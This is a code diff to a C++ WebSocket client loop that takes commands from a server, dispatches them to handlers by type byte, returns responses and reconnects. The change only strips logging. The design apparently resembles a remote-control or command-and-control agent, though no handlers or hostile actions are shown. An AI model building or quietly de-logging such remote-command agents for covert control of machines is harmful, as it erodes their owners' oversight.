@@ -196,13 +196,11 @@ INT32 start()
             return 0;
         }
         WebSocketClient &wsClient = createResult.Value();
-        LOG_INFO("WebSocket connection established (attempt #%u) to %s (identity sent in upgrade headers)",
-                 connectionAttempt, (PCCHAR)urlBuffer);
+        LOG_INFO("WebSocket connection established (attempt #%u) to %s", connectionAttempt, (PCCHAR)urlBuffer);
 
         UINT32 messageCount = 0;
         while (!context.shouldExit)
         {
-            LOG_DEBUG("Waiting for next WebSocket message...");
             auto readResult = wsClient.Read();
             if (!readResult)
             {
@@ -221,20 +219,13 @@ INT32 start()
             UINT8 commandType = command[0];
             command++;
             USIZE commandLength = readResult.Value().Length - sizeof(UINT8);
-            LOG_INFO("Message #%u received: command=%s (0x%02x), payload_length=%u, ws_opcode=%d",
-                     messageCount, CommandTypeName(commandType), (UINT32)commandType,
-                     (UINT32)commandLength, (INT32)readResult.Value().Opcode);
 
             PCHAR response = nullptr;
             USIZE responseLength = sizeof(UINT32);
 
             if (commandType < CommandType::CommandTypeCount && commandHandlers[commandType])
             {
-                LOG_DEBUG("Dispatching command %s to handler", CommandTypeName(commandType));
                 commandHandlers[commandType](command, commandLength, &response, &responseLength, &context);
-                UINT32 statusCode = *(PUINT32)response;
-                LOG_INFO("Command %s completed: status=%u, response_length=%u",
-                         CommandTypeName(commandType), statusCode, (UINT32)responseLength);
             }
             else
             {
@@ -244,7 +235,6 @@ INT32 start()
                 *(PUINT32)response = StatusCode::StatusUnknownCommand;
             }
 
-            LOG_DEBUG("Sending response (%u bytes) to server", (UINT32)responseLength);
             auto writeResult = wsClient.Write(Span<const CHAR>(response, responseLength), WebSocketOpcode::Binary);
             delete[] response;
 
@@ -253,7 +243,6 @@ INT32 start()
                 LOG_ERROR("Failed to send response for command %s, reconnecting...", CommandTypeName(commandType));
                 break;
             }
-            LOG_INFO("Response sent successfully for command %s (%u bytes)", CommandTypeName(commandType), (UINT32)responseLength);
         }
 
         LOG_WARNING("WebSocket session ended after %u messages, will attempt reconnection", messageCount);
